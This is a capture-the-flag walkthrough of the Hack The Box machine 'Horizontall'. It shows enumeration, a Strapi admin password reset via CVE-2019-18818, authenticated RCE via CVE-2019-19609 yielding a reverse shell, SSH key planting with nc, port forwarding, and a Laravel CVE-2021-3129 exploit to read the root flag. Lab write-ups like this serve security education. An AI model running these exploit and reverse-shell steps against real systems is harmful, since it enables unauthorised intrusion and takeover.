## Default Information
IP Address : 10.10.11.105\
Operating System : Linux

## Discovery
Before we being, let's add the IP address and host to our ```/etc/hosts``` file. 
```
10.10.11.105    horizontall.htb 
```
### Nmap
Firstly, let us enumerate all the open ports using Nmap
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.11.105 -vv
```

From the output of Nmap`, we are able to obtain the following information about the open TCP ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | nginx 1.14.0 (Ubuntu) | Open |

Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoowever, there isn't much information for UDP ports that is worth exploring.
```
nmap -sU -Pn 10.10.11.105 -T4 -vv 
```

### Gobuster
Next, we will try to enumerate the endpoints on ```http://horizontall.htb``` using Gobuster. However, we were unable to find any endpoints that are of interest to us. 

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/18 22:07:34 Starting gobuster in directory enumeration mode
===============================================================
http://horizontall.htb/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
http://horizontall.htb/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
http://horizontall.htb/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
```

Next, we will try to enumerate for subdomains using Gobuster. From there we are able to discover a subdomain ```api-prod.horizontall.htb``` which we will add to the ```/etc/hosts``` file

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo gobuster vhost -u http://horizontall.htb -w /home/kali/Desktop/subdomains.txt -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /home/kali/Desktop/subdomains.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/18 22:18:14 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
                                                         
===============================================================
2021/09/18 22:29:02 Finished
===============================================================
```

Next,we will try to enumerate the endpoints on ```api-prod.horizontall.htb``` using Gobuster. We noticed that there are several sites of interest to us which returned a status code of 200

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/18 22:25:29 Starting gobuster in directory enumeration mode
===============================================================
http://api-prod.horizontall.htb/reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/Reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/Users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/Admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/REVIEWS              (Status: 200) [Size: 507]
```

### Web content discovery
Visiting any site of interest that given in the Gobuster output, we realize that we will be redirected to ```/admin/auth/login``` endpoint, which is a Strapi admin login page.

![Strapi Admin login page](https://github.com/joelczk/writeups/blob/main/HTB/Images/horizontall/strapi_admin.PNG)

Next, we will need to find the version of Strapi used. This can be found by calling a curl command to ```/admin/strapiVersion```

```
┌──(kali㉿kali)-[~]
└─$ curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}  
```

## Exploit
### CVE-2019-11818
After some research, we realize that this version of strapi is vulnerable to CVE-2019-11818 and we can obtain an exploit code for it [here](https://www.exploit-db.com/exploits/50237). All we have to do is to modify the URL in the exploit code.
After a few guesses, we managed to guess that the admin email for the website is ```admin@horizontall.htb```, and manage to reset the password for the email
```
┌──(kali㉿kali)-[~/Desktop/cve/CVE-2019-18818]
└─$ python3 exploit.py                                                              2 ⚙
[*] strapi version: 3.0.0-beta.17.4
[*] Password reset for user: admin@horizontall.htb
[*] Setting new password
[+] New password 'password' set for user admin@horizontall.htb
```

Capturing the request when we logint to the admin page, we are able to discover that the endpoint ```/admin/auth/local``` will reveal the jwt token in this response.

![JWT token captured from Burp](https://github.com/joelczk/writeups/blob/main/HTB/Images/horizontall/jwt_burp.PNG)

### CVE-2019-19609
After some more research, we also realize that this version of Strapi is vulnerable to CVE-2019-19609, which is authenticated RCE. Obtaining the exploit script from [here](https://github.com/diego-tella/CVE-2019-19609-EXPLOIT/blob/main/exploit.py), we are able to get a reverse shell (NOTE: The exploit may fail sometimes, when that happens just reset your machine LOLz)

```
┌──(kali㉿kali)-[~/Desktop/cve/CVE-2019-19609]
└─$ python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMyMDI0MjM2LCJleHAiOjE2MzQ2MTYyMzZ9.Ua4b3mL761BCC3gTwYcpyxA9FyLdTvQqPxS1zuJb2qM -l 10.10.16.7 -p 3000
[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)
[+] Remember to start listening to the port 3000 to get a reverse shell
[+] Sending payload... Check if you got shell
[+] Payload sent. Response:
<Response [504]>
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

After obtaining the reverse shell, we will stabilize our shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000  
listening on [any] 3000 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 57282
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ export TERM=xterm
export TERM=xterm
strapi@horizontall:~/myapi$ stty cols 132 rows 34
stty cols 132 rows 34
strapi@horizontall:~/myapi$
```
### Obtaining user flag
Now, all we have to do is to obtain our user flag. 

```
strapi@horizontall:~/myapi$ cd /home/developer
cd /home/developer
strapi@horizontall:/home/developer$ ls
ls
composer-setup.php  myproject  user.txt
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
<Redacted user flag>
strapi@horizontall:/home/developer$ 
```

### Testing for privilege escalation

Next, we will navigate back to the ```/myapi``` directory and execute linpeas script to check for privilege escalation vectors

```
strapi@horizontall:~/myapi$ ./linpeas.sh
./linpeas.sh
bash: ./linpeas.sh: Permission denied
strapi@horizontall:~/myapi$ chmod 777 linpeas.sh
chmod 777 linpeas.sh
strapi@horizontall:~/myapi$ ./linpeas.sh
```

From linpeas.sh, we notice that there is a suspicious service running on localhost on port 8000

<img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/horizontall/suspicious_localhost.PNG" width = "1000">

We will now run a curl command on ```http://localhost:8000```, and we realize that the localhost is running on Laravel v8(PHP v7.4.18)

```
                    </div>

                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
```

### Port-forwarding
Now, we have to do port-forwarding so that we can access the localhost service on our attacker machine. On the attacker's machine, we will have to generate the SSH key using ```ssh-keygen``` and host the key on our attacker's IP

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh-keygen                                                                      2 ⚙
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:QOcxDF7MwRGe9NOBmtlG1lYxoxxSGg2f1qX2cRe8rJ4 kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|      o*X++*+.*o.|
|     o *==+B+* *.|
|      o +B+.B =.+|
|       .+ oo . ++|
|        S.    . .|
|             .   |
|            . .  |
|             E   |
|                 |
+----[SHA256]-----+
                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 6060 < /home/kali/.ssh/id_rsa                                          2 ⚙
listening on [any] 6060 ...
```

Checking the permissions on ```/opt```, we realize that the user ```strapi``` has write permissions

```
strapi@horizontall:~/myapi$ ls -la /opt         
ls -la /opt
total 12
drwxr-xr-x  3 root   root   4096 May 26 14:24 .
drwxr-xr-x 24 root   root   4096 Aug 23 11:29 ..
drwxr-xr-x 10 strapi strapi 4096 Sep 19 04:29 strapi
```

Now, we will add the SSH public key into our list of authorized keys on our victim machine
```
strapi@horizontall:~/myapi$ cd /opt/strapi
cd /opt/strapi
strapi@horizontall:~$ ls -la
ls -la
total 52
drwxr-xr-x 10 strapi strapi 4096 Sep 19 04:29 .
drwxr-xr-x  3 root   root   4096 May 26 14:24 ..
-rw-r--r--  1 strapi strapi  231 Jun  1 12:50 .bash_logout
-rw-r--r--  1 strapi strapi 3810 Jun  1 12:49 .bashrc
drwx------  2 strapi strapi 4096 May 26 14:29 .cache
drwx------  3 strapi strapi 4096 May 26 14:30 .config
drwx------  3 strapi strapi 4096 Sep 19 04:17 .gnupg
drwxrwxr-x  3 strapi strapi 4096 Jun  1 12:07 .local
drwxr-xr-x  9 strapi strapi 4096 Sep 19 04:15 myapi
drwxrwxr-x  5 strapi strapi 4096 Sep 19 04:40 .npm
drwxrwxr-x  5 strapi strapi 4096 Sep 19 04:00 .pm2
-rw-r--r--  1 strapi strapi  807 Apr  4  2018 .profile
drwxrwxr-x  2 strapi strapi 4096 Sep 19 04:29 .ssh
strapi@horizontall:~$ mkdir ~/.ssh
mkdir ~/.ssh
strapi@horizontall:~$ cd .ssh
cd .ssh
strapi@horizontall:~/.ssh$ nc -nv 10.10.16.7 6060 > authorized_keys
nc -nv 10.10.16.7 6060 > authorized_keys
Connection to 10.10.16.7 6060 port [tcp/*] succeeded!
```

Afterwards, we will do the port-forwarding on our attacker machine. We also notice that we are able to view a Laravel page on ```http://127.0.0.1:8000```

```
┌──(kali㉿kali)-[~/Desktop/cve/CVE-2019-19609]
└─$ ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb              3 ⚙
Last login: Sun Sep 19 05:14:43 2021 from 10.10.14.24
$ 
```

![Laravel page](https://github.com/joelczk/writeups/blob/main/HTB/Images/horizontall/laravel_page.PNG)

### CVE-2021-3129 to obtain root flag
After some researching, we realize that laravel v8 is vulnerable to CVE-2021-3129. We will download the exploit script from [here](https://github.com/zhzyker/CVE-2021-3129) and modify it to read the root flag.

```
┌──(kali㉿kali)-[~/Desktop/CVE-2021-3129]
└─$ python3 exp.py http://127.0.0.1:8000/
[*] Try to use Laravel/RCE1 for exploitation.
[+]exploit:
[*] Laravel/RCE1 Result:


[*] Try to use Laravel/RCE2 for exploitation.
[+]exploit:
[*] Laravel/RCE2 Result:


[*] Try to use Laravel/RCE3 for exploitation.
[+]exploit:
[*] Laravel/RCE3 Result:


[*] Try to use Laravel/RCE4 for exploitation.
[+]exploit:
[*] Laravel/RCE4 Result:


[*] Try to use Laravel/RCE5 for exploitation.
[+]exploit:
[*] Laravel/RCE5 Result:

<Redacted system flag>
```
